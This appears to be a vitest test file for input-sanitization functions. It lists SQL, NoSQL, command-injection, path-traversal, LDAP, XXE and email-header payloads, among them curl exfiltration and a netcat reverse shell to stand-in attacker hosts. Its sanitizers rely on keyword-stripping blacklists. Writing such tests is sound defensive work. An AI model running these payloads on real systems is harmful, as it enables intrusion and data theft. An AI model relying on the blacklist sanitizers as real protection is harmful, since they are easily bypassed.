import { describe, it, expect, beforeEach } from 'vitest';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

describe('Input Sanitization Tests', () => {
  let window: any;
  let document: any;

  beforeEach(() => {
    const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
    window = dom.window;
    document = window.document;
    global.window = window;
    global.document = document;
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; INSERT INTO users (admin) VALUES (1); --",
      "' UNION SELECT * FROM passwords --",
      "'; DELETE FROM sessions WHERE '1'='1'; --",
      "' OR 1=1 LIMIT 1 --",
      "') OR ('1'='1",
      "'; EXEC xp_cmdshell('del C:\\*.*'); --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "'; WAITFOR DELAY '00:00:05'; --",
      // Advanced payloads
      "' OR SUBSTRING(password,1,1) = 'a",
      "'; IF (1=1) WAITFOR DELAY '0:0:5' --",
      "' OR (SELECT TOP 1 name FROM sysobjects) = 'users",
      "') UNION SELECT null,null,version() --",
      "'; CREATE USER hacker IDENTIFIED BY 'pass'; --",
    ];

    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should sanitize SQL injection payload ${index + 1}: ${payload.substring(0, 30)}...`, () => {
        const sanitized = sanitizeInput(payload);

        // Should not contain SQL keywords
        expect(sanitized.toUpperCase()).not.toMatch(/\b(DROP|DELETE|INSERT|UPDATE|SELECT|UNION|EXEC|CREATE)\b/);

        // Should not contain SQL injection patterns
        expect(sanitized).not.toMatch(/['"]\s*(OR|AND)\s*['"]/i);
        expect(sanitized).not.toMatch(/--/);
        expect(sanitized).not.toMatch(/\/\*/);
        expect(sanitized).not.toMatch(/;\s*--/);
      });
    });

    it('should use parameterized queries for database operations', () => {
      const userInput = "admin'; DROP TABLE users; --";
      const sanitizedInput = sanitizeInput(userInput);

      // Simulate parameterized query
      const query = 'SELECT * FROM users WHERE username = ?';
      const params = [sanitizedInput];

      expect(query).not.toContain(userInput);
      expect(params[0]).not.toContain('DROP');
      expect(params[0]).not.toContain(';');
    });

    it('should validate input types for database operations', () => {
      const inputs = [
        { value: '123', type: 'integer', expected: 123 },
        { value: 'user@email.com', type: 'email', expected: 'user@email.com' },
        { value: '2023-12-01', type: 'date', expected: '2023-12-01' },
        { value: "'; DROP TABLE", type: 'string', expected: null }, // Invalid
      ];

      inputs.forEach(({ value, type, expected }) => {
        const validated = validateInputType(value, type);
        if (expected === null) {
          expect(validated.valid).toBe(false);
        } else {
          expect(validated.valid).toBe(true);
          expect(validated.value).toBe(expected);
        }
      });
    });
  });

  describe('NoSQL Injection Prevention', () => {
    const noSQLPayloads = [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$where": "function() { return true; }"}',
      '{"$regex": ".*"}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$or": [{"admin": true}]}',
      '{"$eval": "db.users.drop()"}',
      '{"$match": {"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}}',
    ];

    noSQLPayloads.forEach((payload, index) => {
      it(`should prevent NoSQL injection payload ${index + 1}`, () => {
        let parsedPayload;
        try {
          parsedPayload = JSON.parse(payload);
        } catch {
          parsedPayload = payload;
        }

        const sanitized = sanitizeNoSQLInput(parsedPayload);

        if (typeof sanitized === 'object') {
          // Should not contain MongoDB operators
          const jsonString = JSON.stringify(sanitized);
          expect(jsonString).not.toMatch(/\$gt|\$ne|\$where|\$regex|\$or|\$eval|\$expr/);
        }
      });
    });

    it('should validate MongoDB query structure', () => {
      const maliciousQuery = {
        username: { $ne: null },
        $where: 'function() { return true; }'
      };

      const sanitizedQuery = sanitizeMongoQuery(maliciousQuery);

      expect(sanitizedQuery).not.toHaveProperty('$where');
      expect(sanitizedQuery.username).not.toHaveProperty('$ne');
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& echo "hacked"',
      '|| rm -f ~/.ssh/*',
      '`whoami`',
      '$(id)',
      '; curl evil.com/steal?data=$(cat /etc/passwd)',
      '& net user hacker /add',
      '; python -c "import os; os.system(\'rm -rf /\')"',
      '| nc attacker.com 4444 -e /bin/bash',
    ];

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should prevent command injection payload ${index + 1}`, () => {
        const sanitized = sanitizeCommandInput(payload);

        // Should not contain command injection patterns
        expect(sanitized).not.toMatch(/[;&|`$()]/);
        expect(sanitized).not.toMatch(/\|\s*\w/);
        expect(sanitized).not.toMatch(/&&|\|\|/);
        expect(sanitized).not.toContain('rm -rf');
        expect(sanitized).not.toContain('/bin/bash');
      });
    });

    it('should validate file paths for command operations', () => {
      const filePaths = [
        { path: '/etc/passwd', valid: false },
        { path: '../../../etc/passwd', valid: false },
        { path: '/tmp/../etc/passwd', valid: false },
        { path: '/uploads/file.txt', valid: true },
        { path: 'user-file.pdf', valid: true },
      ];

      filePaths.forEach(({ path, valid }) => {
        const result = validateFilePath(path);
        expect(result.valid).toBe(valid);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '/var/www/../../../etc/passwd',
      'file:///etc/passwd',
      '\\..\\..\\..\\etc\\passwd',
    ];

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should prevent path traversal payload ${index + 1}`, () => {
        const sanitized = sanitizeFilePath(payload);

        // Should not contain path traversal patterns
        expect(sanitized).not.toMatch(/\.\./);
        expect(sanitized).not.toMatch(/%2[eE]/); // URL encoded dots
        expect(sanitized).not.toMatch(/%252[eE]/); // Double URL encoded
        expect(sanitized).not.toContain('/etc/');
        expect(sanitized).not.toContain('\\windows\\');
      });
    });

    it('should normalize and validate file paths', () => {
      const basePath = '/var/uploads';
      const userInputs = [
        'file.txt',
        'folder/file.txt',
        '../file.txt',
        '/etc/passwd',
      ];

      userInputs.forEach(input => {
        const normalized = normalizeAndValidatePath(basePath, input);

        if (normalized.valid) {
          expect(normalized.path).toStartWith(basePath);
          expect(normalized.path).not.toContain('../');
        }
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    const ldapInjectionPayloads = [
      '*)(&(objectClass=*))',
      '*)(uid=*',
      '*)((|(uid=*))',
      ')(cn=*))(&(uid=*',
      '\\2a\\29\\28\\7c\\28\\75\\69\\64\\3d\\2a',
      '*)(|(password=*))',
      '*)(&(|(uid=admin)(uid=administrator)))',
    ];

    ldapInjectionPayloads.forEach((payload, index) => {
      it(`should prevent LDAP injection payload ${index + 1}`, () => {
        const sanitized = sanitizeLDAPInput(payload);

        // Should escape LDAP special characters
        expect(sanitized).not.toMatch(/[()&|*\\]/);
        expect(sanitized).not.toContain('objectClass');
      });
    });
  });

  describe('XML Injection Prevention', () => {
    const xmlInjectionPayloads = [
      '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      '<!ENTITY % xxe SYSTEM "http://evil.com/evil.xml">',
      '<script>alert("XSS")</script>',
      ']]><script>alert("XSS")</script><![CDATA[',
      '<?xml-stylesheet type="text/xsl" href="javascript:alert(1)"?>',
    ];

    xmlInjectionPayloads.forEach((payload, index) => {
      it(`should prevent XML injection payload ${index + 1}`, () => {
        const sanitized = sanitizeXMLInput(payload);

        expect(sanitized).not.toContain('<!DOCTYPE');
        expect(sanitized).not.toContain('<!ENTITY');
        expect(sanitized).not.toContain('<?xml-stylesheet');
        expect(sanitized).not.toContain('<script>');
      });
    });
  });

  describe('Email Injection Prevention', () => {
    const emailInjectionPayloads = [
      'user@domain.com\nBCC: attacker@evil.com',
      'user@domain.com\r\nSubject: Hacked',
      'user@domain.com%0ABcc:attacker@evil.com',
      'user@domain.com\nContent-Type: text/html',
      'user@domain.com\r\n\r\nEvil content here',
    ];

    emailInjectionPayloads.forEach((payload, index) => {
      it(`should prevent email injection payload ${index + 1}`, () => {
        const sanitized = sanitizeEmailInput(payload);

        expect(sanitized).not.toMatch(/[\r\n]/);
        expect(sanitized).not.toContain('BCC:');
        expect(sanitized).not.toContain('Subject:');
        expect(sanitized).not.toContain('Content-Type:');
      });
    });
  });

  describe('File Upload Validation', () => {
    it('should validate file extensions', () => {
      const files = [
        { name: 'document.pdf', allowed: true },
        { name: 'image.jpg', allowed: true },
        { name: 'script.exe', allowed: false },
        { name: 'virus.bat', allowed: false },
        { name: 'file.php', allowed: false },
        { name: 'data.json', allowed: true },
      ];

      const allowedExtensions = ['.pdf', '.jpg', '.png', '.txt', '.json'];

      files.forEach(({ name, allowed }) => {
        const result = validateFileExtension(name, allowedExtensions);
        expect(result.valid).toBe(allowed);
      });
    });

    it('should validate file MIME types', () => {
      const files = [
        { mimeType: 'image/jpeg', allowed: true },
        { mimeType: 'application/pdf', allowed: true },
        { mimeType: 'application/x-executable', allowed: false },
        { mimeType: 'text/html', allowed: false },
        { mimeType: 'application/javascript', allowed: false },
      ];

      const allowedMimeTypes = [
        'image/jpeg', 'image/png', 'application/pdf',
        'text/plain', 'application/json'
      ];

      files.forEach(({ mimeType, allowed }) => {
        const result = validateMimeType(mimeType, allowedMimeTypes);
        expect(result.valid).toBe(allowed);
      });
    });

    it('should scan uploaded files for malware', async () => {
      // Mock file content scanning
      const suspiciousPatterns = [
        'eval(',
        '<script>',
        'system(',
        'exec(',
        'shell_exec(',
      ];

      const fileContents = [
        'This is safe content',
        'eval(malicious_code)',
        '<script>alert("XSS")</script>',
        'Normal text file content',
      ];

      for (const content of fileContents) {
        const isSafe = await scanFileContent(content, suspiciousPatterns);
        const shouldBeSafe = !suspiciousPatterns.some(pattern => content.includes(pattern));
        expect(isSafe).toBe(shouldBeSafe);
      }
    });
  });

  describe('Input Length and Format Validation', () => {
    it('should enforce input length limits', () => {
      const inputs = [
        { value: 'a'.repeat(10), maxLength: 50, valid: true },
        { value: 'a'.repeat(100), maxLength: 50, valid: false },
        { value: '', minLength: 5, valid: false },
        { value: 'hello', minLength: 5, valid: true },
      ];

      inputs.forEach(({ value, maxLength, minLength, valid }) => {
        const result = validateInputLength(value, minLength || 0, maxLength || Infinity);
        expect(result.valid).toBe(valid);
      });
    });

    it('should validate input formats with regex', () => {
      const validations = [
        { value: 'user@email.com', pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, valid: true },
        { value: 'invalid-email', pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, valid: false },
        { value: '1234567890', pattern: /^\d{10}$/, valid: true },
        { value: '123-456-7890', pattern: /^\d{10}$/, valid: false },
      ];

      validations.forEach(({ value, pattern, valid }) => {
        const result = validateInputFormat(value, pattern);
        expect(result.valid).toBe(valid);
      });
    });
  });
});

// Input Sanitization Functions
function sanitizeInput(input: string): string {
  if (typeof input !== 'string') {
    return '';
  }

  return input
    .replace(/['"\\;]/g, '') // Remove quotes, backslashes, semicolons
    .replace(/--/g, '') // Remove SQL comments
    .replace(/\/\*.*?\*\//g, '') // Remove block comments
    .replace(/\b(DROP|DELETE|INSERT|UPDATE|SELECT|UNION|EXEC|CREATE|ALTER)\b/gi, '') // Remove SQL keywords
    .trim()
    .substring(0, 1000); // Limit length
}

function validateInputType(value: string, type: string): { valid: boolean; value?: any } {
  switch (type) {
    case 'integer':
      const intValue = parseInt(value);
      return { valid: !isNaN(intValue) && intValue.toString() === value, value: intValue };

    case 'email':
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return { valid: emailRegex.test(value), value };

    case 'date':
      const dateRegex = /^\d{4}-\d{2}-\d{2}$/;
      return { valid: dateRegex.test(value) && !isNaN(Date.parse(value)), value };

    case 'string':
      const isSafe = !/(DROP|DELETE|INSERT|UPDATE|SELECT|UNION|EXEC|CREATE|ALTER|<script|javascript:|on\w+\s*=)/i.test(value);
      return { valid: isSafe, value: isSafe ? value : null };

    default:
      return { valid: false };
  }
}

function sanitizeNoSQLInput(input: any): any {
  if (typeof input === 'string') {
    return input.replace(/[{}$]/g, '');
  }

  if (typeof input === 'object' && input !== null) {
    const sanitized: any = {};

    for (const [key, value] of Object.entries(input)) {
      // Remove MongoDB operators
      if (key.startsWith('$')) {
        continue;
      }

      sanitized[key] = sanitizeNoSQLInput(value);
    }

    return sanitized;
  }

  return input;
}

function sanitizeMongoQuery(query: any): any {
  const sanitized: any = {};

  for (const [key, value] of Object.entries(query)) {
    if (key.startsWith('$')) {
      continue; // Skip MongoDB operators
    }

    if (typeof value === 'object' && value !== null) {
      const sanitizedValue: any = {};
      for (const [subKey, subValue] of Object.entries(value)) {
        if (!subKey.startsWith('$')) {
          sanitizedValue[subKey] = subValue;
        }
      }
      sanitized[key] = sanitizedValue;
    } else {
      sanitized[key] = value;
    }
  }

  return sanitized;
}

function sanitizeCommandInput(input: string): string {
  return input
    .replace(/[;&|`$()]/g, '') // Remove command injection characters
    .replace(/\|\s*\w/g, '') // Remove pipe commands
    .replace(/&&|\|\|/g, '') // Remove command chaining
    .replace(/(rm|del|format|wget|curl|nc|netcat)\s+/gi, '') // Remove dangerous commands
    .trim();
}

function validateFilePath(path: string): { valid: boolean; error?: string } {
  // Check for path traversal
  if (path.includes('..')) {
    return { valid: false, error: 'Path traversal detected' };
  }

  // Check for absolute paths to sensitive directories
  const sensitivePaths = ['/etc/', '/bin/', '/usr/', '/windows/', '/system32/'];
  if (sensitivePaths.some(sensitive => path.toLowerCase().includes(sensitive))) {
    return { valid: false, error: 'Access to sensitive directory denied' };
  }

  // Check for null bytes
  if (path.includes('\0')) {
    return { valid: false, error: 'Null byte detected' };
  }

  return { valid: true };
}

function sanitizeFilePath(path: string): string {
  return path
    .replace(/\.\./g, '') // Remove path traversal
    .replace(/%2[eE]/gi, '') // Remove URL encoded dots
    .replace(/%252[eE]/gi, '') // Remove double URL encoded dots
    .replace(/[\x00-\x1f]/g, '') // Remove control characters
    .replace(/[<>:"|?*]/g, '') // Remove invalid filename characters
    .trim()
    .substring(0, 255); // Limit length
}

function normalizeAndValidatePath(basePath: string, userPath: string): { valid: boolean; path?: string } {
  try {
    const path = require('path');
    const normalized = path.normalize(path.join(basePath, userPath));

    if (!normalized.startsWith(basePath)) {
      return { valid: false };
    }

    return { valid: true, path: normalized };
  } catch (error) {
    return { valid: false };
  }
}

function sanitizeLDAPInput(input: string): string {
  const ldapSpecialChars: { [key: string]: string } = {
    '\\': '\\5c',
    '*': '\\2a',
    '(': '\\28',
    ')': '\\29',
    '\0': '\\00',
  };

  return input.replace(/[\\*()&|=]/g, char => ldapSpecialChars[char] || char);
}

function sanitizeXMLInput(input: string): string {
  return input
    .replace(/<!DOCTYPE[^>]*>/gi, '') // Remove DOCTYPE declarations
    .replace(/<!ENTITY[^>]*>/gi, '') // Remove entity declarations
    .replace(/<\?xml-stylesheet[^>]*\?>/gi, '') // Remove XML stylesheets
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '') // Remove script tags
    .replace(/&[#\w]+;/g, '') // Remove HTML entities
    .replace(/CDATA\[.*?\]\]/gi, ''); // Remove CDATA sections
}

function sanitizeEmailInput(input: string): string {
  return input
    .replace(/[\r\n]/g, '') // Remove line breaks
    .replace(/%(0A|0D|0a|0d)/gi, '') // Remove URL encoded line breaks
    .replace(/(BCC|CC|Subject|Content-Type|To|From):/gi, '') // Remove header injection
    .trim();
}

function validateFileExtension(filename: string, allowedExtensions: string[]): { valid: boolean } {
  const extension = filename.toLowerCase().substring(filename.lastIndexOf('.'));
  return { valid: allowedExtensions.includes(extension) };
}

function validateMimeType(mimeType: string, allowedTypes: string[]): { valid: boolean } {
  return { valid: allowedTypes.includes(mimeType) };
}

async function scanFileContent(content: string, suspiciousPatterns: string[]): Promise<boolean> {
  // Mock virus/malware scanning
  return !suspiciousPatterns.some(pattern => content.includes(pattern));
}

function validateInputLength(value: string, minLength: number, maxLength: number): { valid: boolean } {
  return { valid: value.length >= minLength && value.length <= maxLength };
}

function validateInputFormat(value: string, pattern: RegExp): { valid: boolean } {
  return { valid: pattern.test(value) };
}

export {
  sanitizeInput,
  validateInputType,
  sanitizeNoSQLInput,
  sanitizeCommandInput,
  validateFilePath,
  sanitizeFilePath,
  sanitizeLDAPInput,
  sanitizeXMLInput,
  sanitizeEmailInput,
  validateFileExtension,
  validateMimeType,
  scanFileContent
};